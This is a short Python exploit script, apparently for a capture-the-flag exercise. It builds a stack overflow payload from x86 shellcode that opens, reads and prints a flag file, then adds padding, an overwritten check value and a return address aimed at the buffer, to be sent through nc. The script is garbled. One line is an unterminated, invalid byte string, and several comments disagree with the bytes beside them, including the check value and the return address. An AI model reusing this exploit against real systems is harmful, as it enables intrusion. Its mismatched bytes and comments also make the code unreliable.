import sys
payload = b''
payload += b"shellcode = (
    b"\x31\xc0"                      # xor    eax,eax
    b"\x50"                          # push   eax
    b"\x68\x6f\x68\x2f\x2f"          # push   0x7478742e ; ".txt"
    b"\x68\x72\x2f\x65\x6d"          # push   0x67616c66 ; "flag"
    b"\x68\x68\x73\x74\x65"          # push   0x2f6c6c65 ; "ell/"
    b"\x68\x2f\x6c\x6c\x65"          # push   0x68747365 ; "etsh"
    b"\x68\x67\x61\x6c\x66"          # push   0x722f656d ; "me/r"
    b"\x68\x74\x78\x74\x2e"          # push   0x6f682f68 ; "//ho"
    b"\x89\xe3\x31\xc9\xb0\x05\xcd\x80\x89\xc3\x89\xe1\xb2\x64\xb0\x03\xcd\x80\x89\xc2\x89\xe1\xb3\x01\xb0\x04\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
# Add shellcode(64bytes).
payload += b'A' * (520 - 85 - 4) # Fill with any value.
payload += b'\xef\xcd\x76\x98' # Convert check element as 0x9876cdaf in little endian manner.
payload += b'\x0c\xf4\xff\xbf' # Fill old ebp area as any value.
# $esp = 0xbffff204
payload += b'\x04\xf2\xff\xbf' # Change ret addr as 0xbffff414 which is start addr of buf in little endian manner.
# $ebp = 0xbffff40c

sys.stdout.buffer.write(payload) # write bytes in standard output
print() # recommended to use for the nc-based exploitation
# to flush the remote server's stdin buffer
# bffff834